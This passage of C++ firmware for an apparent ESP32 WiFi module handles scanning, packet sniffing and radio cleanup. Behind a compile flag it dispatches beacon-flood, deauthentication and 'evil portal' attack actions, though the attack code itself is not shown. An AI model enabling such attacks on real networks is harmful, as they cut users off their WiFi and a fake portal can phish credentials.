    if (!scanInFlight) {
        stopRequested = false;
        scanDoneNotice = false;
        runtime.finishCleanup(now);
        return;
    }
    if (!stopRequested) {
        esp_wifi_scan_stop(); // ESP_ERR_WIFI_NOT_STARTED just means it already finished
        stopRequested = true;
    }
    if (!scanDoneNotice) return; // keep cleanupPending until the event really lands

    scanDoneNotice = false;
    WiFi.scanDelete();
    scanInFlight = false;
    stopRequested = false;
    runtime.finishCleanup(now);
}

} // namespace

void begin() { WiFi.onEvent(onScanEvent, ARDUINO_EVENT_WIFI_SCAN_DONE); }

CommandError setEnabled(bool enabled) {
    const uint32_t now = millis();

    if (enabled) {
        if (runtime.status().enabled) return CommandError::None; // idempotent
        runtime.setEnabled(true, now);
        if (runtime.status().cleanupPending) return CommandError::None;
        // Scan/sniff need a live radio; with no AP requested, bring up STA so
        // these features work over the USB dashboard.
        const bool radioOk = ensureUsbRadio();
        runtime.setHealth(radioOk, radioOk ? "ready" : "radio unavailable", now);
        lastHealthMs = now;
        return CommandError::None;
    }

#ifdef ENABLE_DISRUPTIVE
    const bool hadAttack = attackActive;
    if (hadAttack) stopAttack(); // cut raw TX / portal immediately, not next poll
#else
    const bool hadAttack = false;
#endif
    runtime.setEnabled(false, now, scanInFlight || sniffAction || hadAttack);
    activeTicket = 0;
    releaseUsbRadioIfIdle();
    return CommandError::None;
}

CommandError handleAction(ActionId action, const ActionParams &params) {
#ifdef ENABLE_DISRUPTIVE
    if (action == ActionId::WifiBeacon || action == ActionId::WifiDeauth || action == ActionId::WifiEvilPortal) {
        const ActionDescriptor *disruptiveDescriptor = catalog::findAction(ModuleId::Wifi, action);
        if (disruptiveDescriptor == nullptr) return CommandError::UnsupportedAction;
        return startAttack(action, params, *disruptiveDescriptor);
    }
#endif
    if (action == ActionId::WifiSniff) {
        const ActionDescriptor *descriptor = catalog::findAction(ModuleId::Wifi, action);
        if (descriptor == nullptr) return CommandError::UnsupportedAction;

        int64_t channel = wifiSniff::kFirstChannel;
        if (params.present(wifiSniff::ParamChannel)) channel = params.integer(wifiSniff::ParamChannel);
        if (channel < wifiSniff::kFirstChannel) channel = wifiSniff::kFirstChannel;
        if (channel > wifiSniff::kLastChannel) channel = wifiSniff::kLastChannel;
        const bool hop = params.present(wifiSniff::ParamHop) && params.boolean(wifiSniff::ParamHop);

        // Continuous: no module deadline. The arbiter's server-owned 30 s
        // WifiExclusive window ends it; the module never tears the AP down.
        uint32_t ticket = 0;
        const CommandError error = runtime.beginAction(millis(), 0, ticket, *descriptor);
        if (error != CommandError::None) return error;

        activeTicket = ticket;
        sniffAction = true;
        sniffActive = false;
        sniffChannel = static_cast<uint8_t>(channel);
        sniffHop = hop;
        sniffTotal = 0;
        lastHopMs = millis();
        lastSniffSampleMs = 0;
        sniffRing.reset();
        sniffBatch.clear();
        // Radio start is deferred to poll(): during the arbiter's grace the AP
        // may still be up (or the radio handed over by wifiAp) and must not be
        // disturbed before teardown.
        return CommandError::None;
    }

    const ActionDescriptor *descriptor = catalog::findAction(ModuleId::Wifi, action);
    if (descriptor == nullptr || action != ActionId::Scan) return CommandError::UnsupportedAction;

    uint32_t ticket = 0;
    const CommandError error = runtime.beginAction(millis(), kScanDeadlineMs, ticket, *descriptor);
    if (error != CommandError::None) return error;

    activeTicket = ticket;
    scanInFlight = true;
    stopRequested = false;
    scanDoneNotice = false;

    if (WiFi.scanNetworks(/*async=*/true) == WIFI_SCAN_FAILED) {
        scanInFlight = false;
        activeTicket = 0;
        runtime.failAction(ticket, ActionError::ScanFailed, millis(), false);
    }
    return CommandError::None; // accepted; failures surface via actionState
}

void poll() {
    const uint32_t now = millis();

    if (runtime.status().cleanupPending) {
        performCleanup(now);
        if (runtime.status().cleanupPending) return;
        // Cleanup finished: re-arm the USB-usable radio while the module is
        // still enabled, or drop a STA this module owned.
        if (runtime.status().enabled) ensureUsbRadio();
        else releaseUsbRadioIfIdle();
    }
    if (!runtime.status().enabled) return; // disabled: no polling, never touches a live AP

    if (runtime.status().actionState == ActionState::Running) {
#ifdef ENABLE_DISRUPTIVE
        if (attackActive) {
            stepAttack(now);
            return;
        }
#endif
        if (sniffAction) stepSniff(now);
        else stepScan(now);
        return;
    }

    if (static_cast<uint32_t>(now - lastHealthMs) < kHealthRecheckMs) return;
    lastHealthMs = now;
    const bool radioOk = ensureUsbRadio();
    runtime.setHealth(radioOk, radioOk ? "ready" : "radio unavailable", now);
}

const ModuleStatus &status() { return runtime.status(); }

uint32_t revision() { return runtime.revision(); }

bool takeActionOutput(ActionOutput &output) { return runtime.takeActionOutput(output); }

} // namespace wifiModule
